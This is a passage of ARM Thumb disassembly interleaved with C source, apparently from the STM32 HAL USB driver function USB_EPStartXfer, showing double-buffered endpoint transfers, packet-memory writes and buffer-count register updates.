 8006fb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fb8:	681b      	ldr	r3, [r3, #0]
 8006fba:	781b      	ldrb	r3, [r3, #0]
 8006fbc:	00da      	lsls	r2, r3, #3
 8006fbe:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006fc0:	4413      	add	r3, r2
 8006fc2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006fc6:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006fc8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fcc:	b29a      	uxth	r2, r3
 8006fce:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006fd0:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006fd2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fd6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fda:	681b      	ldr	r3, [r3, #0]
 8006fdc:	895b      	ldrh	r3, [r3, #10]
 8006fde:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006fe2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fe6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fea:	681b      	ldr	r3, [r3, #0]
 8006fec:	6959      	ldr	r1, [r3, #20]
 8006fee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ff2:	b29b      	uxth	r3, r3
 8006ff4:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006ff8:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006ffc:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007000:	6800      	ldr	r0, [r0, #0]
 8007002:	f001 fb66 	bl	80086d2 <USB_WritePMA>
            ep->xfer_buff += len;
 8007006:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800700a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800700e:	681b      	ldr	r3, [r3, #0]
 8007010:	695a      	ldr	r2, [r3, #20]
 8007012:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007016:	441a      	add	r2, r3
 8007018:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800701c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007020:	681b      	ldr	r3, [r3, #0]
 8007022:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8007024:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007028:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800702c:	681b      	ldr	r3, [r3, #0]
 800702e:	6a1a      	ldr	r2, [r3, #32]
 8007030:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007034:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007038:	681b      	ldr	r3, [r3, #0]
 800703a:	691b      	ldr	r3, [r3, #16]
 800703c:	429a      	cmp	r2, r3
 800703e:	d90f      	bls.n	8007060 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8007040:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007044:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007048:	681b      	ldr	r3, [r3, #0]
 800704a:	6a1a      	ldr	r2, [r3, #32]
 800704c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007050:	1ad2      	subs	r2, r2, r3
 8007052:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007056:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800705a:	681b      	ldr	r3, [r3, #0]
 800705c:	621a      	str	r2, [r3, #32]
 800705e:	e00e      	b.n	800707e <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8007060:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007064:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007068:	681b      	ldr	r3, [r3, #0]
 800706a:	6a1b      	ldr	r3, [r3, #32]
 800706c:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8007070:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007074:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007078:	681b      	ldr	r3, [r3, #0]
 800707a:	2200      	movs	r2, #0
 800707c:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 800707e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007082:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007086:	681b      	ldr	r3, [r3, #0]
 8007088:	785b      	ldrb	r3, [r3, #1]
 800708a:	2b00      	cmp	r3, #0
 800708c:	d177      	bne.n	800717e <USB_EPStartXfer+0x4c4>
 800708e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007092:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007096:	681b      	ldr	r3, [r3, #0]
 8007098:	61bb      	str	r3, [r7, #24]
 800709a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800709e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070a2:	681b      	ldr	r3, [r3, #0]
 80070a4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80070a8:	b29b      	uxth	r3, r3
 80070aa:	461a      	mov	r2, r3
 80070ac:	69bb      	ldr	r3, [r7, #24]
 80070ae:	4413      	add	r3, r2
 80070b0:	61bb      	str	r3, [r7, #24]
 80070b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070ba:	681b      	ldr	r3, [r3, #0]
 80070bc:	781b      	ldrb	r3, [r3, #0]
 80070be:	00da      	lsls	r2, r3, #3
 80070c0:	69bb      	ldr	r3, [r7, #24]
 80070c2:	4413      	add	r3, r2
 80070c4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80070c8:	617b      	str	r3, [r7, #20]
 80070ca:	697b      	ldr	r3, [r7, #20]
 80070cc:	881b      	ldrh	r3, [r3, #0]
 80070ce:	b29b      	uxth	r3, r3
 80070d0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80070d4:	b29a      	uxth	r2, r3
 80070d6:	697b      	ldr	r3, [r7, #20]
 80070d8:	801a      	strh	r2, [r3, #0]
 80070da:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070de:	2b3e      	cmp	r3, #62	; 0x3e
 80070e0:	d921      	bls.n	8007126 <USB_EPStartXfer+0x46c>
 80070e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070e6:	095b      	lsrs	r3, r3, #5
 80070e8:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 80070ec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070f0:	f003 031f 	and.w	r3, r3, #31
 80070f4:	2b00      	cmp	r3, #0
 80070f6:	d104      	bne.n	8007102 <USB_EPStartXfer+0x448>
 80070f8:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 80070fc:	3b01      	subs	r3, #1
 80070fe:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007102:	697b      	ldr	r3, [r7, #20]
 8007104:	881b      	ldrh	r3, [r3, #0]
 8007106:	b29a      	uxth	r2, r3
 8007108:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 800710c:	b29b      	uxth	r3, r3
 800710e:	029b      	lsls	r3, r3, #10
 8007110:	b29b      	uxth	r3, r3
 8007112:	4313      	orrs	r3, r2
 8007114:	b29b      	uxth	r3, r3
 8007116:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800711a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800711e:	b29a      	uxth	r2, r3
 8007120:	697b      	ldr	r3, [r7, #20]
 8007122:	801a      	strh	r2, [r3, #0]
 8007124:	e056      	b.n	80071d4 <USB_EPStartXfer+0x51a>
 8007126:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800712a:	2b00      	cmp	r3, #0
 800712c:	d10a      	bne.n	8007144 <USB_EPStartXfer+0x48a>
 800712e:	697b      	ldr	r3, [r7, #20]
 8007130:	881b      	ldrh	r3, [r3, #0]
 8007132:	b29b      	uxth	r3, r3
 8007134:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007138:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800713c:	b29a      	uxth	r2, r3
 800713e:	697b      	ldr	r3, [r7, #20]
 8007140:	801a      	strh	r2, [r3, #0]
 8007142:	e047      	b.n	80071d4 <USB_EPStartXfer+0x51a>
 8007144:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007148:	085b      	lsrs	r3, r3, #1
 800714a:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 800714e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007152:	f003 0301 	and.w	r3, r3, #1
 8007156:	2b00      	cmp	r3, #0
 8007158:	d004      	beq.n	8007164 <USB_EPStartXfer+0x4aa>
 800715a:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 800715e:	3301      	adds	r3, #1
 8007160:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007164:	697b      	ldr	r3, [r7, #20]
 8007166:	881b      	ldrh	r3, [r3, #0]
 8007168:	b29a      	uxth	r2, r3
 800716a:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 800716e:	b29b      	uxth	r3, r3
 8007170:	029b      	lsls	r3, r3, #10
 8007172:	b29b      	uxth	r3, r3
 8007174:	4313      	orrs	r3, r2
 8007176:	b29a      	uxth	r2, r3
 8007178:	697b      	ldr	r3, [r7, #20]
 800717a:	801a      	strh	r2, [r3, #0]
 800717c:	e02a      	b.n	80071d4 <USB_EPStartXfer+0x51a>
 800717e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007182:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007186:	681b      	ldr	r3, [r3, #0]
 8007188:	785b      	ldrb	r3, [r3, #1]
 800718a:	2b01      	cmp	r3, #1
 800718c:	d122      	bne.n	80071d4 <USB_EPStartXfer+0x51a>
 800718e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007192:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007196:	681b      	ldr	r3, [r3, #0]
 8007198:	623b      	str	r3, [r7, #32]
 800719a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800719e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071a2:	681b      	ldr	r3, [r3, #0]
 80071a4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80071a8:	b29b      	uxth	r3, r3
 80071aa:	461a      	mov	r2, r3
 80071ac:	6a3b      	ldr	r3, [r7, #32]
 80071ae:	4413      	add	r3, r2
 80071b0:	623b      	str	r3, [r7, #32]
 80071b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071ba:	681b      	ldr	r3, [r3, #0]
 80071bc:	781b      	ldrb	r3, [r3, #0]
 80071be:	00da      	lsls	r2, r3, #3
 80071c0:	6a3b      	ldr	r3, [r7, #32]
 80071c2:	4413      	add	r3, r2
 80071c4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80071c8:	61fb      	str	r3, [r7, #28]
 80071ca:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ce:	b29a      	uxth	r2, r3
 80071d0:	69fb      	ldr	r3, [r7, #28]
 80071d2:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 80071d4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071d8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071dc:	681b      	ldr	r3, [r3, #0]
 80071de:	891b      	ldrh	r3, [r3, #8]
 80071e0:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80071e4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071e8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071ec:	681b      	ldr	r3, [r3, #0]
 80071ee:	6959      	ldr	r1, [r3, #20]
 80071f0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071f4:	b29b      	uxth	r3, r3
 80071f6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80071fa:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80071fe:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007202:	6800      	ldr	r0, [r0, #0]
 8007204:	f001 fa65 	bl	80086d2 <USB_WritePMA>
 8007208:	e3ee      	b.n	80079e8 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 800720a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800720e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007212:	681b      	ldr	r3, [r3, #0]
 8007214:	785b      	ldrb	r3, [r3, #1]
 8007216:	2b00      	cmp	r3, #0
 8007218:	d177      	bne.n	800730a <USB_EPStartXfer+0x650>
 800721a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800721e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007222:	681b      	ldr	r3, [r3, #0]
 8007224:	64bb      	str	r3, [r7, #72]	; 0x48
 8007226:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800722a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800722e:	681b      	ldr	r3, [r3, #0]
 8007230:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007234:	b29b      	uxth	r3, r3
 8007236:	461a      	mov	r2, r3
 8007238:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800723a:	4413      	add	r3, r2
 800723c:	64bb      	str	r3, [r7, #72]	; 0x48
 800723e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007242:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007246:	681b      	ldr	r3, [r3, #0]
 8007248:	781b      	ldrb	r3, [r3, #0]
 800724a:	00da      	lsls	r2, r3, #3
 800724c:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800724e:	4413      	add	r3, r2
 8007250:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007254:	647b      	str	r3, [r7, #68]	; 0x44
 8007256:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007258:	881b      	ldrh	r3, [r3, #0]
 800725a:	b29b      	uxth	r3, r3
 800725c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007260:	b29a      	uxth	r2, r3
 8007262:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007264:	801a      	strh	r2, [r3, #0]
 8007266:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800726a:	2b3e      	cmp	r3, #62	; 0x3e
 800726c:	d921      	bls.n	80072b2 <USB_EPStartXfer+0x5f8>
 800726e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007272:	095b      	lsrs	r3, r3, #5
 8007274:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007278:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800727c:	f003 031f 	and.w	r3, r3, #31
 8007280:	2b00      	cmp	r3, #0
 8007282:	d104      	bne.n	800728e <USB_EPStartXfer+0x5d4>
 8007284:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007288:	3b01      	subs	r3, #1
 800728a:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800728e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007290:	881b      	ldrh	r3, [r3, #0]
 8007292:	b29a      	uxth	r2, r3
 8007294:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007298:	b29b      	uxth	r3, r3
 800729a:	029b      	lsls	r3, r3, #10
 800729c:	b29b      	uxth	r3, r3
 800729e:	4313      	orrs	r3, r2
 80072a0:	b29b      	uxth	r3, r3
 80072a2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80072a6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80072aa:	b29a      	uxth	r2, r3
 80072ac:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80072ae:	801a      	strh	r2, [r3, #0]
 80072b0:	e056      	b.n	8007360 <USB_EPStartXfer+0x6a6>
 80072b2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072b6:	2b00      	cmp	r3, #0
 80072b8:	d10a      	bne.n	80072d0 <USB_EPStartXfer+0x616>
 80072ba:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80072bc:	881b      	ldrh	r3, [r3, #0]
 80072be:	b29b      	uxth	r3, r3
 80072c0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80072c4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80072c8:	b29a      	uxth	r2, r3
 80072ca:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80072cc:	801a      	strh	r2, [r3, #0]
 80072ce:	e047      	b.n	8007360 <USB_EPStartXfer+0x6a6>
 80072d0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072d4:	085b      	lsrs	r3, r3, #1
 80072d6:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80072da:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072de:	f003 0301 	and.w	r3, r3, #1
 80072e2:	2b00      	cmp	r3, #0
 80072e4:	d004      	beq.n	80072f0 <USB_EPStartXfer+0x636>
 80072e6:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80072ea:	3301      	adds	r3, #1
 80072ec:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80072f0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80072f2:	881b      	ldrh	r3, [r3, #0]
 80072f4:	b29a      	uxth	r2, r3
 80072f6:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80072fa:	b29b      	uxth	r3, r3
 80072fc:	029b      	lsls	r3, r3, #10
 80072fe:	b29b      	uxth	r3, r3
 8007300:	4313      	orrs	r3, r2
 8007302:	b29a      	uxth	r2, r3
 8007304:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007306:	801a      	strh	r2, [r3, #0]
 8007308:	e02a      	b.n	8007360 <USB_EPStartXfer+0x6a6>
 800730a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800730e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007312:	681b      	ldr	r3, [r3, #0]
 8007314:	785b      	ldrb	r3, [r3, #1]
 8007316:	2b01      	cmp	r3, #1
 8007318:	d122      	bne.n	8007360 <USB_EPStartXfer+0x6a6>
 800731a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800731e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007322:	681b      	ldr	r3, [r3, #0]
 8007324:	653b      	str	r3, [r7, #80]	; 0x50
 8007326:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800732a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800732e:	681b      	ldr	r3, [r3, #0]
 8007330:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007334:	b29b      	uxth	r3, r3
 8007336:	461a      	mov	r2, r3
 8007338:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800733a:	4413      	add	r3, r2
 800733c:	653b      	str	r3, [r7, #80]	; 0x50
 800733e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007342:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007346:	681b      	ldr	r3, [r3, #0]
 8007348:	781b      	ldrb	r3, [r3, #0]
 800734a:	00da      	lsls	r2, r3, #3
 800734c:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800734e:	4413      	add	r3, r2
 8007350:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007354:	64fb      	str	r3, [r7, #76]	; 0x4c
 8007356:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800735a:	b29a      	uxth	r2, r3
 800735c:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 800735e:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8007360:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007364:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007368:	681b      	ldr	r3, [r3, #0]
 800736a:	891b      	ldrh	r3, [r3, #8]
 800736c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007370:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007374:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007378:	681b      	ldr	r3, [r3, #0]
 800737a:	6959      	ldr	r1, [r3, #20]
 800737c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007380:	b29b      	uxth	r3, r3
 8007382:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007386:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800738a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800738e:	6800      	ldr	r0, [r0, #0]
 8007390:	f001 f99f 	bl	80086d2 <USB_WritePMA>
            ep->xfer_buff += len;
 8007394:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007398:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800739c:	681b      	ldr	r3, [r3, #0]
 800739e:	695a      	ldr	r2, [r3, #20]
 80073a0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073a4:	441a      	add	r2, r3
 80073a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073aa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073ae:	681b      	ldr	r3, [r3, #0]
 80073b0:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 80073b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073ba:	681b      	ldr	r3, [r3, #0]
 80073bc:	6a1a      	ldr	r2, [r3, #32]
 80073be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073c6:	681b      	ldr	r3, [r3, #0]
 80073c8:	691b      	ldr	r3, [r3, #16]
 80073ca:	429a      	cmp	r2, r3
 80073cc:	d90f      	bls.n	80073ee <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 80073ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073d2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073d6:	681b      	ldr	r3, [r3, #0]
 80073d8:	6a1a      	ldr	r2, [r3, #32]
 80073da:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073de:	1ad2      	subs	r2, r2, r3
 80073e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073e4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073e8:	681b      	ldr	r3, [r3, #0]
 80073ea:	621a      	str	r2, [r3, #32]
 80073ec:	e00e      	b.n	800740c <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 80073ee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073f2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073f6:	681b      	ldr	r3, [r3, #0]
 80073f8:	6a1b      	ldr	r3, [r3, #32]
 80073fa:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 80073fe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007402:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007406:	681b      	ldr	r3, [r3, #0]
 8007408:	2200      	movs	r2, #0
 800740a:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 800740c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007410:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007414:	681b      	ldr	r3, [r3, #0]
 8007416:	643b      	str	r3, [r7, #64]	; 0x40
 8007418:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800741c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007420:	681b      	ldr	r3, [r3, #0]
 8007422:	785b      	ldrb	r3, [r3, #1]
 8007424:	2b00      	cmp	r3, #0
 8007426:	d177      	bne.n	8007518 <USB_EPStartXfer+0x85e>
 8007428:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800742c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007430:	681b      	ldr	r3, [r3, #0]
 8007432:	63bb      	str	r3, [r7, #56]	; 0x38
 8007434:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007438:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800743c:	681b      	ldr	r3, [r3, #0]
 800743e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007442:	b29b      	uxth	r3, r3
 8007444:	461a      	mov	r2, r3
 8007446:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007448:	4413      	add	r3, r2
 800744a:	63bb      	str	r3, [r7, #56]	; 0x38
 800744c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007450:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007454:	681b      	ldr	r3, [r3, #0]
 8007456:	781b      	ldrb	r3, [r3, #0]
 8007458:	00da      	lsls	r2, r3, #3
 800745a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800745c:	4413      	add	r3, r2
 800745e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007462:	637b      	str	r3, [r7, #52]	; 0x34
 8007464:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007466:	881b      	ldrh	r3, [r3, #0]
 8007468:	b29b      	uxth	r3, r3
 800746a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800746e:	b29a      	uxth	r2, r3
 8007470:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007472:	801a      	strh	r2, [r3, #0]
 8007474:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007478:	2b3e      	cmp	r3, #62	; 0x3e
 800747a:	d921      	bls.n	80074c0 <USB_EPStartXfer+0x806>
 800747c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007480:	095b      	lsrs	r3, r3, #5
 8007482:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007486:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800748a:	f003 031f 	and.w	r3, r3, #31
 800748e:	2b00      	cmp	r3, #0
 8007490:	d104      	bne.n	800749c <USB_EPStartXfer+0x7e2>
 8007492:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007496:	3b01      	subs	r3, #1
 8007498:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800749c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800749e:	881b      	ldrh	r3, [r3, #0]
 80074a0:	b29a      	uxth	r2, r3
 80074a2:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80074a6:	b29b      	uxth	r3, r3
 80074a8:	029b      	lsls	r3, r3, #10
 80074aa:	b29b      	uxth	r3, r3
 80074ac:	4313      	orrs	r3, r2
 80074ae:	b29b      	uxth	r3, r3
 80074b0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074b4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074b8:	b29a      	uxth	r2, r3
 80074ba:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80074bc:	801a      	strh	r2, [r3, #0]
 80074be:	e050      	b.n	8007562 <USB_EPStartXfer+0x8a8>
 80074c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074c4:	2b00      	cmp	r3, #0
 80074c6:	d10a      	bne.n	80074de <USB_EPStartXfer+0x824>
 80074c8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80074ca:	881b      	ldrh	r3, [r3, #0]
 80074cc:	b29b      	uxth	r3, r3
 80074ce:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074d2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074d6:	b29a      	uxth	r2, r3
 80074d8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80074da:	801a      	strh	r2, [r3, #0]
 80074dc:	e041      	b.n	8007562 <USB_EPStartXfer+0x8a8>
 80074de:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074e2:	085b      	lsrs	r3, r3, #1
 80074e4:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80074e8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074ec:	f003 0301 	and.w	r3, r3, #1
 80074f0:	2b00      	cmp	r3, #0
 80074f2:	d004      	beq.n	80074fe <USB_EPStartXfer+0x844>
